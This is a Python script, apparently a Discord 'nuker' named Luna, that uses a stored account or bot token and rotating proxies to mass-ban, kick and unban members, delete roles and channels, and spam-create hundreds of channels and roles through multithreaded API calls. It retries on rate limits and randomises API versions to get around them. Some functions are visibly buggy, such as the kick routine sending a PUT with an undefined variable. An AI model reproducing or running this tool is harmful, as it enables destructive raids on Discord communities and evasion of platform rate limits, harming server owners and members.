import sys
import json
import string
import random
from os import system
from random import randint
from itertools import cycle
from time import time, sleep
from threading import Thread
from pypresence import Presence
from requests_futures.sessions import FuturesSession

version = "1.0"

session = FuturesSession()
user_ids = []
role_ids = []
channel_ids = []
proxies = []
rotating = cycle(proxies)

if sys.platform == "linux":
    clear = lambda: system("clear")
else:
    clear = lambda: system("cls & mode 80,24")

clear()
print('''
     \x1b[38;5;199m    __                     
        / /   __  ______  ____ _
       / /   / / / / __ \/ __ `/
      / /___/ /_/ / / / / /_/ / 
     /_____/\__,_/_/ /_/\__,_/  \x1b[0mBETA\x1b[0m
''')

try:
    for line in open('Proxies.txt'):
        proxies.append(line.replace('\n', ''))
except:
    print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mFailed To Load Proxies From Proxies.txt")

with open('Config.json') as f:
    config = json.load(f)

Token = config.get('Token')
Bot = config.get('Bot')
if Bot == True:
    headers = {"Authorization": f"Bot {Token}"}
else:
    headers = {"Authorization": f"{Token}"}

class LunaMisc:


    def Check(token, bot):
        if bot == True:
            headers = {"Authorization": f"Bot {token}"}
        else:
            headers = {"Authorization": f"{token}"}
        r = session.get("https://discord.com/api/v8/users/@me", headers=headers).result()
        if r.status_code == 200:
            return True
        else:
            return False

    def Ban(guild_id, member_id):
        try:
            r = session.put(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/bans/{member_id}", headers=headers, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Banned {member_id}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Ban, args=(guild_id, member_id,)).start()
        except:
            pass

    def Unban(guild_id, member_id):
        try:
            r = session.delete(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/bans/{member_id}", headers=headers, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Unbanned {member_id}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Unban, args=(guild_id, member_id,)).start()
        except:
            pass

    def Kick(guild_id, member_id):
        try:
            r = session.put(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/members/{member}", headers=headers, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Kicked {member_id}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Ban, args=(guild_id, member_id,)).start()
        except: 
            pass

    def Delete_Channel(channel_id):
        try:
            r = session.delete(f"https://discord.com/api/v{randint(6,8)}/channels/{channel_id}", headers=headers, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Deleted {member_id}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Delete_Channel, args=(channel_id,)).start()
        except: 
            pass

    def Delete_Role(guild_id, role_id):
        try:
            r = session.delete(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/roles/{role_id}", headers=headers, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Deleted {member_id}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Delete_Role, args=(guild_id, role_id,)).start()
        except: 
            pass

    def Create_Channel(guild_id):
        try:
            name = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(8))
            json = {'name': name, 'type': 0}
            r = session.post(f'https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/channels', headers=headers, json=json, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Created Channel {r.json()['id']}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Create_Channel, args=(guild_id,)).start()
        except:
            pass

    def Create_Role(guild_id):
        try:
            name = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(8))
            json = {'name': name}
            r = session.post(f'https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/roles', headers=headers, json=json, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Created Role {r.json()['id']}")
            if r.status_code == 429:
                Thread(target=LunaMisc.Create_Role, args=(guild_id,)).start()
        except:
            pass


def Init():
    if LunaMisc.Check(Token, Bot):
        print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mAuthenticated Token!")
        guild = input(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mGuild\x1b[38;5;199m: \x1b[0m")

        try:
            members = open('Scraped/Members.txt').readlines()
            for member in members:
                member = member.replace("\n", "")
                user_ids.append(member)

            roles = open('Scraped/Roles.txt').readlines()
            for role in roles:
                role = role.replace("\n", "")
                role_ids.append(role)

            channels = open('Scraped/Channels.txt').readlines()
            for channel in channels:
                channel = channel.replace("\n", "")
                channel_ids.append(channel)
        except:
            print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mFailed To Load Scraped Data!")

        print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mLoaded {len(user_ids)} Members!")
        print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mLoaded {len(role_ids)} Roles!")
        print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mLoaded {len(channel_ids)} Channels!")
        sleep(2)
        Menu(guild)
    else:
        print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mInvalid Token!")
        input()
        exit()

def Menu(guild):
	try:
	    clear()
	    print('''
     \x1b[38;5;199m    __                     
        / /   __  ______  ____ _
       / /   / / / / __ \/ __ `/
      / /___/ /_/ / / / / /_/ / 
     /_____/\__,_/_/ /_/\__,_/  \x1b[0mBETA\x1b[0m

     \x1b[38;5;199m[\x1b[0m1\x1b[38;5;199m] \x1b[0mBan Users
     \x1b[38;5;199m[\x1b[0m2\x1b[38;5;199m] \x1b[0mKick Users
     \x1b[38;5;199m[\x1b[0m3\x1b[38;5;199m] \x1b[0mUnban Users
     \x1b[38;5;199m[\x1b[0m4\x1b[38;5;199m] \x1b[0mDelete Roles
     \x1b[38;5;199m[\x1b[0m5\x1b[38;5;199m] \x1b[0mDelete Channels
     \x1b[38;5;199m[\x1b[0m6\x1b[38;5;199m] \x1b[0mCreate Channels
     \x1b[38;5;199m[\x1b[0m7\x1b[38;5;199m] \x1b[0mCreate Roles
	    ''')
	    opt = input(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mOption\x1b[38;5;199m: \x1b[0m")
	    if opt == "1":
	        for i in range(len(user_ids)):
	            Thread(target=LunaMisc.Ban, args=(guild, user_ids[i],)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "2":
	        for i in range(len(user_ids)):
	            Thread(target=LunaMisc.Kick, args=(guild, user_ids[i],)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "3":
	        for i in range(len(user_ids)):
	            Thread(target=LunaMisc.Unban, args=(guild, user_ids[i],)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "4":
	        for i in range(len(role_ids)):
	            Thread(target=LunaMisc.Delete_Role, args=(guild, role_ids[i],)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "5":
	        for i in range(len(channel_ids)):
	            Thread(target=LunaMisc.Delete_Channel, args=(channel_ids[i],)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "6":
	        for i in range(250):
	            Thread(target=LunaMisc.Create_Channel, args=(guild,)).start()
	        sleep(2)
	        Menu(guild)
	    elif opt == "7":
	        for i in range(150):
	            Thread(target=LunaMisc.Create_Role, args=(guild,)).start()
	        sleep(2)
	        Menu(guild)
	    else:
	        Init()
	except:
		pass

if __name__ == "__main__":
    Init()